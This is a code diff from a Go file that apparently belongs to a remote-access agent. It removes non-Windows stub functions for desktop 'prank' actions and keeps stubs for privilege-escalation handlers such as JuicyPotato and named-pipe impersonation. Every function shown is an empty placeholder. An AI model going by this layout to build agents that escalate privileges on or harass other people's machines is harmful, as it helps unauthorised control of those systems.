@@ -62,33 +62,6 @@ func handleADCSFullAuditImpl(task Task, res *TaskResult) {
 	_ = task
 }
 
-// Interactive prank handlers dispatch on runtime.GOOS; the ...Windows helpers
-// still need compile-time symbols on non-Windows builds.
-func setWallpaperWindows(path string) string {
-	_ = path
-	return "unsupported on this platform"
-}
-func showMsgBoxWindows(msg, title string) string {
-	return "unsupported on this platform"
-}
-func playBeepWindows() string          { return "unsupported on this platform" }
-func playSoundWindows(path string) string {
-	return "unsupported on this platform"
-}
-func openURLWindows(url string) string {
-	_ = url
-	return "unsupported on this platform"
-}
-func screenRotateWindows() string      { return "unsupported on this platform" }
-func cdRomTrayWindows(action string) string {
-	return "unsupported on this platform"
-}
-func lockWorkstationWindows() string   { return "unsupported on this platform" }
-func setVolumeWindows(level int) string {
-	return "unsupported on this platform"
-}
-func cursorFlipWindows() string { return "unsupported on this platform" }
-
 // Privilege-escalation and recon handlers registered from windows-tagged files.
 func handleJuicyPotato(task Task, res *TaskResult)        { res.Error = "Windows only"; _ = task }
 func handleNamedPipeImpersonate(task Task, res *TaskResult) { res.Error = "Windows only"; _ = task }
